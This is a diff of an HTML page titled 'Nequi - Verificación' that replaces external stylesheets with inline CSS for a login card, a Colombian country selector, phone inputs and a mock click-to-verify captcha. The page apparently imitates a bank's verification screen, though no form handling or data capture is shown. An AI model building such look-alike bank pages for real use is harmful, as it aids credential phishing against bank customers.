@@ -4,11 +4,185 @@
     <meta charset="utf-8">
     <title>Nequi - Verificación</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" type="text/css" href="css/normalize.css">
-    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
-    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
-    <link rel="stylesheet" type="text/css" href="css/main.css">
-    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
+    <style>
+        /* Estilos básicos inline para que funcione sin CSS externos */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Manrope', -apple-system, sans-serif;
+            background-color: #f5f5f5;
+            color: #200020;
+        }
+
+        .wrap-header {
+            background-color: #ffffff;
+            padding: 15px 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo img {
+            height: 30px;
+        }
+
+        .login-section {
+            max-width: 450px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+
+        .login-wrap {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            color: #200020;
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            font-size: 1rem;
+            margin-bottom: 30px;
+        }
+
+        .input-country {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .select-country {
+            width: 100px;
+            padding: 15px;
+            background: #fbf7fb;
+            border: 1px solid #200020;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .flag-icon {
+            width: 24px;
+            height: 16px;
+            background: linear-gradient(to bottom, #FFD700 33%, #0033A0 33%, #0033A0 66%, #CE1126 66%);
+            border-radius: 2px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+            flex: 1;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            background: #fbf7fb;
+            border: 1px solid #200020;
+            border-radius: 8px;
+            font-size: 1rem;
+            color: #200020;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #da0081;
+        }
+
+        .form-group label {
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            color: #666;
+            pointer-events: none;
+            transition: 0.2s;
+        }
+
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
+            background: white;
+            padding: 0 5px;
+            color: #da0081;
+        }
+
+        .captcha-container {
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .captcha {
+            width: 250px;
+            height: 70px;
+            background: #e0e0e0;
+            border: 2px solid #200020;
+            border-radius: 8px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .captcha.selected {
+            background: #d4edda;
+            border-color: #28a745;
+        }
+
+        .captcha.selected::before {
+            content: "✓ ";
+            color: #28a745;
+            font-size: 20px;
+            margin-right: 8px;
+        }
+
+        .form-btn-submit {
+            width: 100%;
+            padding: 18px;
+            background: #200020;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .form-btn-submit:hover:not(:disabled) {
+            background: #3d003d;
+        }
+
+        .form-btn-submit:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        @media (max-width: 768px) {
+            .login-section {
+                padding: 10px;
+            }
+
+            .login-wrap {
+                padding: 30px 20px;
+            }
+        }
+    </style>
 </head>
 
 <body>
